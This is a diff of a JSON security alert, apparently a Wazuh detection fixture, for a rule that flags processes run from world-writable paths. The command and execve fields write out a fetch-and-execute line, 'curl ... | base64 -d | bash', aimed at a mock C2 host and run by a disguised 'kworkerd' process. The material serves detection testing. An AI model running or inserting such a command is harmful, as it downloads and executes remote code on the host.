@@ -5,13 +5,39 @@
     "id": "100330",
     "level": 10,
     "description": "Suspicious process executed from a world-writable path (possible payload execution)",
-    "groups": ["audit", "process_execution", "vigix_custom"],
+    "groups": [
+      "audit",
+      "process_execution",
+      "vigix_custom"
+    ],
     "firedtimes": 1,
-    "mitre": { "id": ["T1059.004"], "tactic": ["Execution"], "technique": ["Unix Shell"] }
+    "mitre": {
+      "id": [
+        "T1059.004"
+      ],
+      "tactic": [
+        "Execution"
+      ],
+      "technique": [
+        "Unix Shell"
+      ]
+    },
+    "mail": false
   },
-  "agent": { "id": "003", "name": "WEB-01", "ip": "10.0.3.10" },
-  "manager": { "name": "wazuh-manager" },
-  "decoder": { "name": "auditd" },
+  "agent": {
+    "id": "003",
+    "name": "WEB-01",
+    "ip": "10.0.3.10"
+  },
+  "manager": {
+    "name": "wazuh-manager"
+  },
+  "decoder": {
+    "name": "auditd"
+  },
+  "input": {
+    "type": "log"
+  },
   "location": "/var/log/audit/audit.log",
   "data": {
     "audit": {
@@ -21,7 +47,30 @@
       "parent": "tail",
       "uid": "33",
       "user": "www-data",
-      "auid": "0"
+      "auid": "0",
+      "type": "SYSCALL",
+      "id": "842",
+      "syscall": "59",
+      "success": "yes",
+      "exit": "0",
+      "pid": "28114",
+      "gid": "33",
+      "euid": "33",
+      "suid": "33",
+      "fsuid": "33",
+      "egid": "33",
+      "sgid": "33",
+      "fsgid": "33",
+      "tty": "(none)",
+      "session": "412",
+      "comm": "kworkerd",
+      "key": "audit-wazuh-c",
+      "cwd": "/tmp/.cache",
+      "execve": {
+        "a0": "/bin/bash",
+        "a1": "-c",
+        "a2": "curl -s http://vigix-mock-c2.net/x | base64 -d | bash"
+      }
     },
     "command": "curl -s http://vigix-mock-c2.net/x | base64 -d | bash",
     "file": "/tmp/.cache/kworkerd",
